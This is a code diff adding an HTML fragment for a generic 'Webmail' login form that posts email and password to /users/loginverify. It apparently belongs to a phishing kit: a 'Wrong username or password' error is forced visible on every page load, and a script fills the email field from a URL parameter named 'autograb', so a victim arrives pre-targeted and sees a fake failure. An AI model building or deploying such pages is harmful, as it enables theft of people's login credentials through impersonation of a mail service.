@@ -1,0 +1,57 @@
+<div class="card-body">
+      <!-- Red Text Alert -->
+      <div class="alert alert-danger" id="loginErrorAlert">
+        Wrong username or password. Please try again.
+      </div>
+    <form action="/users/loginverify" method="post">
+        <!-- Username Field -->
+        <div class="form-group">
+            <label for="username">Email</label>
+            <div class="input-group">
+                <div class="input-group-prepend">
+                    <span class="input-group-text"><i class="fas fa-user"></i></span>
+                </div>
+                <input type="text" class="form-control" id="email" name="email"
+                    placeholder="Enter your eamil" required>
+
+            </div>
+        </div>
+
+        <!-- Password Field -->
+        <div class="form-group">
+            <label for="password">Password</label>
+            <div class="input-group">
+                <div class="input-group-prepend">
+                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                </div>
+                <input type="password" class="form-control" id="password" name="password"
+                    placeholder="Enter your password" required>
+            </div>
+        </div>
+
+        <!-- Submit Button -->
+        <button type="submit" class="btn btn-primary btn-block">Login</button>
+    </form>
+    <!-- Centered Text under Login -->
+    <p class="text-center mt-3">Webmail</p>
+</div>
+<script>
+    document.getElementById('loginErrorAlert').style.display = 'block';
+  
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const email = getParameterByName('autograb');
+            if (email) {
+                document.getElementById('email').value = email;
+            }
+        });
+   
+  </script>
